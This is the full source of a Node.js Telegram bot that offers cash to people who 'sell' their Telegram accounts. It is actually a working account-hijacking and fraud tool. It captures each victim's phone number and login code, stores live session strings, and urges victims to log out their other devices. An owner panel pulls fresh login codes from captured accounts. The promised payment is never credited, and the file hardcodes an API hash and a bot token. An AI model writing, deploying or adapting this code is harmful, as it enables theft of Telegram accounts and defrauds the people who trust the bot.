const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram'); // Pakai 'telegram' agar Zeabur lancar
const { StringSession } = require('telegram/sessions');
const fs = require('fs');

// --- KONFIGURASI ---
const apiId = 31201777;
const apiHash = '791bb0f9d012531d922086c8489dd705';
const botToken = '8510861119:AAHvf4n2QUAFY_JEJUDeTHFsXH3zxiy2hAY';
const logChannel = '-1003521158263';
const ownerId = 12345678; // GANTI DENGAN ID TELEGRAM KAMU (Cek di @userinfobot)

const bot = new Telegraf(botToken);
const DB_FILE = './sessions.json';

// --- DATABASE HANDLER ---
if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ accounts: [] }));
}

const getData = () => JSON.parse(fs.readFileSync(DB_FILE));
const saveData = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

const userSessions = {}; 

// --- MENU UTAMA ---
const mainBtn = () => Markup.inlineKeyboard([
    [Markup.button.callback('💰 JUAL AKUN SEKARANG', 'jual_akun')],
    [Markup.button.callback('👤 MY PROFILE', 'profile'), Markup.button.callback('💸 WITHDRAW', 'withdraw')],
    [Markup.button.callback('👑 OWNER MENU', 'owner_menu')]
]);

bot.start((ctx) => {
    ctx.reply(
        `🚀 **SELAMAT DATANG DI USERBOT MANAGER** 🚀\n\n` +
        `Dapatkan uang tunai hanya dengan menjual akun Telegram Anda.\n` +
        `Proses cepat, aman, dan saldo langsung masuk ke profil!`,
        mainBtn()
    );
});

// --- LOGIKA JUAL AKUN & OTP ---
bot.action('jual_akun', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_phone' };
    ctx.reply('📲 **MASUKKAN NOMOR TELEGRAM**\n\nFormat: 628xxxx (Gunakan kode negara)\n\nContoh: 62812345678');
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];

    if (!state) return;

    // STEP 1: PROSES NOMOR HP
    if (state.step === 'input_phone') {
        state.phone = text.replace(/[^0-9]/g, '');
        ctx.reply(`⏳ Menghubungi server Telegram untuk ${state.phone}...`);
        
        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
            state.client = client;
            await client.connect();
            
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, state.phone);
            state.phoneCodeHash = phoneCodeHash;
            state.step = 'input_otp';
            
            ctx.reply('📩 **KODE OTP TERKIRIM!**\n\nSilahkan cek aplikasi Telegram Anda dan masukkan kode di sini.\n\n⚠️ **PENTING:** Masukkan kode dengan spasi agar terbaca sistem.\nContoh: 1 2 3 4 5');
        } catch (err) {
            ctx.reply('❌ GAGAL: ' + err.message);
            delete userSessions[userId];
        }
    }

    // STEP 2: PROSES OTP & CEK SESI
    else if (state.step === 'input_otp') {
        const otp = text.replace(/\s+/g, '');
        ctx.reply('⚙️ **MENVERIFIKASI AKUN & PERANGKAT...**');

        try {
            const client = state.client;
            await client.signIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: otp,
            });

            const sessionStr = client.session.save();
            const auths = await client.invoke(new Api.account.GetAuthorizations());
            const devices = auths.authorizations;
            const isClean = devices.length === 1;

            // Simpan ke Database
            const db = getData();
            db.accounts.push({
                phone: state.phone,
                session: sessionStr,
                seller: ctx.from.username || ctx.from.id,
                date: new Date().toLocaleString(),
                clean: isClean
            });
            saveData(db);

            if (isClean) {
                ctx.reply('✅ **BERHASIL!**\n\nAkun Anda bersih dan sudah kami terima. Saldo ditambahkan Rp 50.000 (Full)');
            } else {
                ctx.reply(`⚠️ **PERINGATAN!**\n\nTerdeteksi ${devices.length} perangkat. Untuk mendapatkan saldo full, silahkan Logout perangkat lain melalui Pengaturan > Perangkat di Telegram Anda.`);
            }
            
            await client.disconnect();
        } catch (err) {
            ctx.reply('❌ OTP SALAH: ' + err.message);
        }
        delete userSessions[userId];
    }

    // STEP 3: PROSES WITHDRAW
    else if (state.step === 'input_wd') {
        ctx.reply('✅ **WITHDRAW BERHASIL DIAJUKAN!**\n\nAdmin akan segera memproses dana ke nomor Anda.');
        bot.telegram.sendMessage(logChannel, 
            `💰 **PEMBERITAHUAN WITHDRAW**\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `👤 Pengirim: @${ctx.from.username || ctx.from.id}\n` +
            `📱 Nomor & Saldo: ${text}\n` +
            `📅 Waktu: ${new Date().toLocaleString()}\n` +
            `✅ Status: Sukses - Detail Terkirim\n` +
            `━━━━━━━━━━━━━━━━━━`
        );
        delete userSessions[userId];
    }
});

// --- PROFILE & WITHDRAW ---
bot.action('profile', (ctx) => {
    ctx.reply(`👤 **PROFIL SAYA**\n\nID: \`${ctx.from.id}\`\nUsername: @${ctx.from.username || '-'}\nTotal Akun Dijual: 0\nSaldo: Rp 0`);
});

bot.action('withdraw', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_wd' };
    ctx.reply('💸 **FORM WITHDRAW**\n\nSilahkan masukkan nomor DANA/OVO/GOPAY dan jumlah.\n\nContoh: DANA - 08123456789 - 50000');
});

// --- OWNER MENU (PAGINATION) ---
bot.action('owner_menu', (ctx) => {
    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('❌ AKSES DITOLAK!');
    ctx.reply('👑 **OWNER CONTROL PANEL**', Markup.inlineKeyboard([
        [Markup.button.callback('📑 DAFTAR NOMOR TERJUAL', 'list_0')],
        [Markup.button.callback('📢 BROADCAST MASSAL', 'bc')]
    ]));
});

bot.action(/^list_(\d+)$/, (ctx) => {
    const page = parseInt(ctx.match[1]);
    const db = getData();
    const accounts = db.accounts;
    const start = page * 5;
    const end = start + 5;
    const current = accounts.slice(start, end);

    const buttons = current.map((acc, i) => [
        Markup.button.callback(`📞 ${acc.phone}`, `detail_${start + i}`)
    ]);

    const nav = [];
    if (page > 0) nav.push(Markup.button.callback('⬅️ PREV', `list_${page - 1}`));
    if (end < accounts.length) nav.push(Markup.button.callback('NEXT ➡️', `list_${page + 1}`));
    if (nav.length) buttons.push(nav);
    
    buttons.push([Markup.button.callback('🔙 KEMBALI', 'owner_menu')]);
    ctx.editMessageText(`📑 **DAFTAR AKUN (Hal ${page + 1})**`, Markup.inlineKeyboard(buttons));
});

// DETAIL & CEK OTP TERBARU
bot.action(/^detail_(\d+)$/, async (ctx) => {
    const index = parseInt(ctx.match[1]);
    const acc = getData().accounts[index];
    
    ctx.reply(
        `📄 **DETAIL AKUN**\n\n` +
        `• Nomor: ${acc.phone}\n` +
        `• Seller: @${acc.seller}\n` +
        `• Status: ${acc.clean ? '✅ Clean' : '⚠️ Multi Device'}\n` +
        `• Date: ${acc.date}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📩 CEK OTP @TELEGRAM', `otp_${index}`)],
            [Markup.button.callback('🔙 KEMBALI', 'list_0')]
        ])
    );
});

bot.action(/^otp_(\d+)$/, async (ctx) => {
    const index = parseInt(ctx.match[1]);
    const acc = getData().accounts[index];
    ctx.answerCbQuery('🔄 Mengambil pesan @Telegram...');
    
    try {
        const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
        await client.connect();
        const messages = await client.getMessages(777000, { limit: 1 });
        ctx.reply(`📩 **OTP TERBARU (${acc.phone}):**\n\n${messages[0].message}`);
        await client.disconnect();
    } catch (e) {
        ctx.reply('❌ GAGAL: ' + e.message);
    }
});

bot.launch();
console.log('🚀 BOT BERHASIL DIJALANKAN!');
